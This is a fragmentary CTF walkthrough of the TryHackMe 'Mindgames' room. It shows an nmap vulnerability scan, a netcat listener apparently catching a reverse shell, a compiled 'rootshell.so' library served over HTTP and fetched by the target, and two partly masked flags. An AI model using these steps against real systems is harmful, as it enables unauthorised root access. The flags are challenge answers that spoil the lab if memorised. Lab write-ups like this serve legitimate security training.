...
```
bibo318@parrot:~/CTFs/tryhackme/Mindgames$ sudo nmap -A -sS -sC -sV --script vuln 10.10.69.233
...
```
bibo318@parrot:~/CTFs/tryhackme/Mindgames$ nc -nlvp 9001
...
```
bibo318@parrot:~/CTFs/tryhackme/Mindgames$ gcc -fPIC -o rootshell.o -c rootshell.c
bibo318@parrot:~/CTFs/tryhackme/Mindgames$ gcc -shared -o rootshell.so -lcrypto rootshell.o
bibo318@parrot:~/CTFs/tryhackme/Mindgames$ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.69.233 - - [13/Oct/2020 11:03:58] "GET /rootshell.so HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
bibo318@parrot:~/CTFs/tryhackme/Mindgames$
```
...
`thm{411f7d38247ff441ce4e134b459b626812**123:))}`

2. Root flag.

`thm{1974a617cc84c5b51411c283544ee25412**123:))}`
